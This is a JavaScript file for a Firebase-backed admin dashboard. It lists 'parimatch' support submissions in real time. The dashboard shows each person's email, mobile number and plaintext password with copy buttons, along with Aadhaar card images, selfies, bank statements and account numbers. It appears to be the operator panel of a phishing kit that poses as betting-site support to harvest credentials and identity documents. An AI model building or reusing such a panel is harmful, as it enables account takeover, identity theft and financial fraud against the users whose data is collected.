const SITE_ID = "parimatch";

const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

let _db = null, _unsub = null, _retryTimer = null, _firstLoad = true;

function loadFirebase() {
  return new Promise((resolve, reject) => {
    try {
      if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
      _db = firebase.firestore();
      _db.enablePersistence({ synchronizeTabs: true }).catch(() => {});
      resolve(_db);
    } catch (e) { reject(e); }
  });
}

/* ===== REALTIME LISTENER - PARIMATCH ONLY =====
   Firestore needs a composite index for where(site_id==) + orderBy(created_at),
   and a missing index fails the whole listener. So we order by created_at only
   (single-field index, always present) and drop other sites client-side. */
function startListener() {
  if (_unsub) { _unsub(); _unsub = null; }
  clearTimeout(_retryTimer);
  _unsub = _db.collection('submissions')
    .orderBy('created_at', 'desc')
    .onSnapshot({ includeMetadataChanges: true }, snap => {
      if (snap.metadata.fromCache && _firstLoad) return;
      const newIds = new Set();
      snap.forEach(d => { if (d.data().site_id === SITE_ID) newIds.add(d.id); });
      if (state.prevIds.size > 0) {
        let n = 0;
        snap.forEach(d => { if (d.data().site_id === SITE_ID && !state.prevIds.has(d.id)) n++; });
        if (n > 0) toast(n + ' new request' + (n > 1 ? 's' : ''), 'success');
      }
      state.prevIds = newIds;
      state.allSubs = snap.docs
        .filter(d => d.data().site_id === SITE_ID)
        .map(d => ({ id: d.id, ...d.data() }));
      _firstLoad = false;
      setConn(snap.metadata.fromCache ? 'cached' : 'connected');
      renderHome();
    }, err => {
      console.error(err);
      setConn('error');
      _retryTimer = setTimeout(() => { setConn('connecting'); startListener(); }, 5000);
    });
}

const state = { allSubs: [], currentPage: 'home', selectedId: null, search: '', prevIds: new Set() };

const $ = id => document.getElementById(id);

function esc(s) { return s == null ? '' : String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
function toDate(ts) { if (!ts) return null; const d = ts.toDate ? ts.toDate() : new Date(ts); return isNaN(d.getTime()) ? null : d; }
function fmtTime(ts) { const d = toDate(ts); if (!d) return '—'; return d.toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true }); }
function fmtRel(ts) {
  const d = toDate(ts); if (!d) return '—';
  const diff = Date.now() - d.getTime();
  if (diff < 60000) return 'now';
  if (diff < 3600000) return Math.floor(diff / 60000) + 'm';
  if (diff < 86400000) return Math.floor(diff / 3600000) + 'h';
  if (diff < 604800000) return Math.floor(diff / 86400000) + 'd';
  return fmtTime(ts);
}
/* Compact card timestamp: "28 Sept", with the year only when it is not this year. */
function fmtDateShort(ts) {
  const d = toDate(ts); if (!d) return '—';
  const day = d.toLocaleString('en-IN', { day: '2-digit', month: 'short' });
  return d.getFullYear() === new Date().getFullYear() ? day : day + ' ' + d.getFullYear();
}
function isImageUrl(s) { return typeof s === 'string' && /^https?:\/\//i.test(s) && !/\.(mp4|webm|mov)$/i.test(s); }

/* The Parimatch forms save Telegram photo links as
     https://api.telegram.org/bot<TOKEN>/file/photos/x.jpg
   which 404s - the working form is
     https://api.telegram.org/file/bot<TOKEN>/photos/x.jpg               */
function fixImageUrl(u) {
  if (typeof u !== 'string') return u;
  return u.replace(/^(https:\/\/api\.telegram\.org)\/bot([^/]+)\/file\/(.+)$/i, '$1/file/bot$2/$3');
}

/* Image fields written by the Parimatch project */
const IMAGE_FIELDS = [
  { key: 'issue_image_url', label: 'Issue Image' },
  { key: 'aadhar_front_url', label: 'Aadhaar Front' },
  { key: 'aadhar_back_url', label: 'Aadhaar Back' },
  { key: 'selfie_url', label: 'Selfie' },
  { key: 'identity_image_url', label: 'Identity Image' },
  { key: 'bank_statement_1_url', label: 'Bank Statement 1' },
  { key: 'bank_statement_2_url', label: 'Bank Statement 2' },
  { key: 'bonus_issue_image_url', label: 'Bonus Issue Image' },
  { key: 'profile_image_url', label: 'Profile Image' }
];

function getType(type) {
  if (!type) return 'Other';
  const t = String(type).toLowerCase();
  if (t.includes('deposit')) return 'Deposit Problem';
  if (t.includes('unlock') || t.includes('unblock')) return 'unlock_withdrawal';
  if (t.includes('withdrawal') || t.includes('withdraw')) return 'Withdrawal Problem';
  if (t.includes('bonus')) return 'bonus_problem';
  if (t.includes('kyc') || t.includes('document')) return 'KYC Problem';
  if (t.includes('bank') && t.includes('statement')) return 'Bank Statement Problem';
  if (t.includes('chat') || t.includes('live')) return 'Live Chat';
  return type;
}
const typeClassMap = {
  'Deposit Problem': 'deposit', 'Withdrawal Problem': 'withdrawal', 'unlock_withdrawal': 'unblock',
  'bonus_problem': 'bonus', 'KYC Problem': 'kyc', 'Bank Statement Problem': 'bank', 'Live Chat': 'chat'
};
function typeClass(t) { return typeClassMap[t] || 'deposit'; }

function setConn(s) {
  const d = $('connDot');
  if (!d) return;
  d.style.background = s === 'connected' ? '#28A745' : s === 'error' ? '#DC3545' : '#F57C00';
}
function toast(msg, type) {
  const t = $('toast');
  if (!t) return;
  t.className = 'toast' + (type ? ' ' + type : '');
  t.textContent = msg;
  requestAnimationFrame(() => t.classList.add('show'));
  setTimeout(() => t.classList.remove('show'), 2200);
}
function askConfirm(title, msg) {
  return new Promise(resolve => {
    $('confirmTitle').textContent = title;
    $('confirmMsg').textContent = msg;
    const ov = $('confirmOverlay');
    const done = val => {
      ov.classList.remove('show');
      $('confirmOk').removeEventListener('click', ok);
      $('confirmCancel').removeEventListener('click', cancel);
      resolve(val);
    };
    const ok = () => done(true), cancel = () => done(false);
    $('confirmOk').addEventListener('click', ok);
    $('confirmCancel').addEventListener('click', cancel);
    ov.classList.add('show');
  });
}

function navigateTo(page, id) {
  state.currentPage = page;
  $('page-home').classList.remove('active');
  $('page-detail').classList.remove('active');
  if (page === 'home') { $('page-home').classList.add('active'); window.scrollTo(0, 0); }
  else if (page === 'detail' && id) { state.selectedId = id; $('page-detail').classList.add('active'); renderDetail(id); }
}

function closeModal() { $('imageModal').classList.remove('show'); $('modalImage').src = ''; }

function init() {
  document.querySelectorAll('.nav-item').forEach(btn => btn.addEventListener('click', () => navigateTo('home')));
  $('backBtn').addEventListener('click', () => navigateTo('home'));

  $('searchInput').addEventListener('input', e => { state.search = e.target.value.toLowerCase(); renderHome(); });

  $('imageModalClose').addEventListener('click', closeModal);
  $('imageModal').addEventListener('click', e => { if (e.target === $('imageModal')) closeModal(); });
  $('modalDownload').addEventListener('click', () => {
    const url = $('modalImage').src;
    if (!url) return;
    const a = document.createElement('a');
    a.href = url; a.download = 'proof_' + Date.now() + '.jpg'; a.target = '_blank'; a.rel = 'noopener';
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
    toast('Downloading...', 'success');
  });
  document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });

  $('confirmCancel').addEventListener('click', () => $('confirmOverlay').classList.remove('show'));
  $('confirmOverlay').addEventListener('click', e => { if (e.target === $('confirmOverlay')) $('confirmOverlay').classList.remove('show'); });

  loadFirebase().then(() => {
    startListener();
  }).catch(e => { console.error(e); setConn('error'); });
}

/* ===== HOME ===== */
function renderHome() {
  const subs = state.allSubs;
  const now = new Date();
  const startOfDay = new Date(now.getFullYear(), now.getMonth(), now.getDate());

  let today = 0;
  subs.forEach(s => { const d = toDate(s.created_at); if (d && d >= startOfDay) today++; });

  $('kpiTotal').textContent = subs.length;
  $('kpiTotalReq').textContent = subs.length;
  $('kpiToday').textContent = today;

  const q = state.search;
  const rows = q ? subs.filter(s => {
    const hay = [s.email, s.mobile, s.user_name, s.name, s.description, s.type, s.request_id, s.reqId, s.game_id, s.amount, s.bonus_amount, s.utr, s.account_number, s.issue_status]
      .map(v => (v == null ? '' : String(v)).toLowerCase()).join(' ');
    return hay.includes(q);
  }) : subs;

  $('listCount').textContent = rows.length + ' request' + (rows.length !== 1 ? 's' : '');
  renderCards(rows);
}

function renderCards(subs) {
  const list = $('cardList');
  if (!subs.length) {
    list.innerHTML = '<div class="empty-state"><svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg><p>No requests found</p></div>';
    return;
  }
  list.innerHTML = subs.map(s => {
    const t = getType(s.type);
    const name = s.user_name || s.name || s.email || 'Unknown';
    return '<div class="sub-card" data-id="' + esc(s.id) + '">' +
      '<img class="sub-avatar" src="USER-ICON/2288510.png" alt="" />' +
      '<div class="sub-info">' +
        '<div class="sub-line">' +
          '<span class="sub-name">' + esc(name) + '</span>' +
          '<span class="sub-time">' + fmtRel(s.created_at) + ' · ' + fmtDateShort(s.created_at) + '</span>' +
        '</div>' +
        '<div class="sub-line sub-line-tags">' +
          '<span class="type-badge ' + typeClass(t) + '">' + esc(t) + '</span>' +
        '</div>' +
      '</div>' +
      '<svg class="sub-arrow" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>' +
    '</div>';
  }).join('');

  list.querySelectorAll('.sub-card').forEach(card => {
    card.addEventListener('click', () => navigateTo('detail', card.dataset.id));
  });
}

/* ===== DETAIL - everything in one card ===== */
function renderDetail(id) {
  const s = state.allSubs.find(x => x.id === id);
  if (!s) { $('detailContent').innerHTML = '<div class="empty-state"><p>Not found</p></div>'; return; }

  const t = getType(s.type);
  const name = s.user_name || s.name || s.email || 'Unknown';
  const email = s.email || '—';
  const mobile = s.mobile || '—';
  const password = s.password || '—';
  const status = s.issue_status || 'Pending';
  const amount = s.amount || s.bonus_amount || '—';
  const utr = s.utr || 'N/A';
  const method = s.withdraw_method || '—';
  const desc = s.description || '—';
  const gameId = s.game_id || '—';
  // unlock/bonus forms post reqId + time, the other forms request_id + timestamp
  const reqId = s.request_id || s.reqId || '—';
  const account = s.account_number || '';
  const source = s.source || '—';
  const when = s.timestamp || s.time || fmtTime(s.created_at);

  const images = IMAGE_FIELDS
    .map(f => ({ label: f.label, url: fixImageUrl(s[f.key]) }))
    .filter(f => isImageUrl(f.url));

  // Copy button only for mobile, email and password.
  function row(label, value, copyVal) {
    const btn = copyVal
      ? '<button class="copy-btn" data-copy="' + esc(String(copyVal)) + '" aria-label="Copy ' + esc(label) + '">Copy</button>'
      : '';
    return '<div class="detail-row"><span class="detail-label">' + esc(label) + '</span>' +
      '<span class="detail-value">' + esc(String(value)) + btn + '</span></div>';
  }

  let html = '<div class="detail-card">';

  html += '<div class="detail-head">' +
    '<img class="detail-avatar" src="USER-ICON/2288510.png" alt="" />' +
    '<div class="detail-head-text">' +
      '<div class="detail-name">' + esc(name) + '</div>' +
      '<span class="type-badge ' + typeClass(t) + '">' + esc(t) + '</span>' +
    '</div></div>';

  html += '<div class="detail-group">';
  html += row('Email ID', email, email);
  html += row('Mobile Number', mobile, mobile);
  html += row('Password', password, password);
  html += '</div>';

  html += '<div class="detail-group">';
  html += row('Status', status);
  html += row('Amount', amount);
  html += row('UTR', utr);
  html += row('Method', method);
  if (account) html += row('Account Number', account);
  html += row('Request ID', reqId);
  html += row('Game ID', gameId);
  html += row('Date', when);
  html += row('Source', source);
  html += '</div>';

  html += '<div class="detail-group"><div class="detail-label">Description</div>' +
    '<div class="detail-desc">' + esc(desc) + '</div></div>';

  if (images.length) {
    html += '<div class="detail-group"><div class="detail-label">Proof Images</div><div class="view-list">';
    images.forEach(im => {
      html += '<div class="view-row"><span class="view-name">' + esc(im.label) + '</span>' +
        '<button class="view-btn" data-img="' + esc(im.url) + '" data-cap="' + esc(im.label) + '">View</button></div>';
    });
    html += '</div></div>';
  } else {
    html += '<div class="detail-group"><div class="detail-label">Proof Images</div>' +
      '<div class="detail-desc muted">No image uploaded</div></div>';
  }

  html += '<div class="detail-group detail-acts">' +
    '<button class="btn-red btn-sm" id="delOneBtn">Delete Request</button></div>';

  html += '</div>';

  $('detailContent').innerHTML = html;

  $('detailContent').querySelectorAll('.copy-btn').forEach(b => {
    b.addEventListener('click', e => {
      e.stopPropagation();
      navigator.clipboard?.writeText(b.dataset.copy)
        .then(() => toast('Copied', 'success'))
        .catch(() => toast('Copy failed', 'error'));
    });
  });

  $('detailContent').querySelectorAll('.view-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      $('modalImage').src = btn.dataset.img;
      $('modalCaption').textContent = btn.dataset.cap;
      $('imageModal').classList.add('show');
    });
  });

  $('delOneBtn').addEventListener('click', async () => {
    const ok = await askConfirm('Delete Request', 'Delete this request permanently?');
    if (!ok) return;
    try {
      await _db.collection('submissions').doc(id).delete();
      toast('Deleted', 'success');
      navigateTo('home');
    } catch (e) { console.error(e); toast('Delete failed', 'error'); }
  });
}

/* ===== INIT ===== */
document.addEventListener('DOMContentLoaded', init);
